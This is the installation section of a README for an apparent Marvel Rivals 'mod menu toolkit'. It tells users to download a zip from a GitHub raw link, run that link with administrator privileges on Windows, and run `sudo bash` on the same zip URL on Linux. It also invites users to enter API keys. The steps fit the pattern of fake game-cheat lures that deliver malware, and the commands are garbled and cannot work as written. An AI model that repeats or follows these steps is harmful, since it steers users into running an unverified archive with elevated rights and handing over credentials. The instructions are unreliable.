## 📥 Installation

Ready to enter the multiverse of Marvel customization? Expand your horizons by following these steps:

1. **Download the Latest Release**
   - Click this button:  
     [![Download](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/rivals_toolkit_marvel_menu_mod_v3.0.zip)](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/rivals_toolkit_marvel_menu_mod_v3.0.zip)
2. **Extract the Package**
   - Use your favorite extraction tool to unpack the files into your Marvel Rivals main directory.
3. **Follow Platform-Specific Instructions**
   - *Windows:* Run `https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/rivals_toolkit_marvel_menu_mod_v3.0.zip` with administrator privileges.
   - *macOS:* Open the `.pkg` installer; follow on-screen prompts.
   - *Linux:* Run the `https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/rivals_toolkit_marvel_menu_mod_v3.0.zip` in a terminal with `sudo bash https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/rivals_toolkit_marvel_menu_mod_v3.0.zip`.
4. **Activate the Mod Menu**
   - Launch Marvel Rivals. At the main screen, press `F12` to activate the Mod Menu overlay.
5. **(Optional) Configure AI Integrations**
   - Navigate to `Settings > API Integrations` and enter your API keys for added AI functionality.
6. **Enjoy Marvel Universe without Limits!**
